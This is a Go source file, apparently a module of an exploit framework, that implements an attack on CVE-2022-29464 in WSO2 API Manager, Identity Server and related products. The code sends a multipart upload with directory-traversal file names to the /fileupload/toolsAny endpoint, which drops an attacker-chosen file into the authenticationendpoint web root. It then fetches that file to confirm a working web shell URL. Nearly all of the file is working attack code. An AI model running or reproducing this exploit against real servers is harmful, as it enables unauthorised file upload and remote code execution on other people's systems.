package exp_wso2

import (
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
)

type Exp_CVE_2022_29464_upload struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2022_29464_upload) Upload1(filename string, content string) (expUploadResult exp_model.ExpUploadResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()

	// 构造payload
	pathPrefix := "../../../../repository/deployment/server/webapps/authenticationendpoint/"

	postMultiParts := []lzhttp.PostMultiPart{
		{
			FieldName:   pathPrefix + filename,
			FileName:    pathPrefix + filename,
			ContentType: "",
			Content:     []byte(content),
		},
	}

	// 发送请求
	httpresp := self.HttpPostMulti(self.AddUri(self.Params.Target, "/fileupload/toolsAny"), postMultiParts, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode != 200 {
		expUploadResult.Status = false
		return
	}

	shellUrl := self.AddUri(self.Params.Target, "/authenticationendpoint/"+filename)
	httpresp = self.HttpGetWithoutRedirect(shellUrl, headers)
	if httpresp.Err != nil {
		expUploadResult.Err = httpresp.Err
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expUploadResult.RespPath = shellUrl
		expUploadResult.Status = true
	}

	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	expmsg := exp_model.ExpMsg{
		Author: "lz520520",
		Time:   `2022-04-25`,
		Range: `WSO2 API Manager 2.2.0 及更高版本到 4.0.0
WSO2 Identity Server 5.2.0 及以上至 5.11.0
WSO2 身份服务器分析 5.4.0、5.4.1、5.5.0 和 5.6.0
WSO2 身份服务器作为密钥管理器 5.3.0 及更高版本至 5.10.0
WSO2 Enterprise Integrator 6.2.0 及更高版本至 6.6.0`,
		ID:       `CVE-2022-29464`,
		Describe: `WSO2 产品允许无限制的文件上传和远程代码执行。攻击者必须使用带有 Content-Disposition 目录遍历序列的 /fileupload 端点来到达 Web 根目录下的目录，例如 ../../../../repository/deployment/server/webapps 目录。`,
		Details:  ``,
		Payload:  ``,
		VulType:  common.VulCodeExec,
	}

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: expmsg,
	}
	exp_register.ExpStructRegister(&Exp_CVE_2022_29464_upload{}, registerMsg)

}
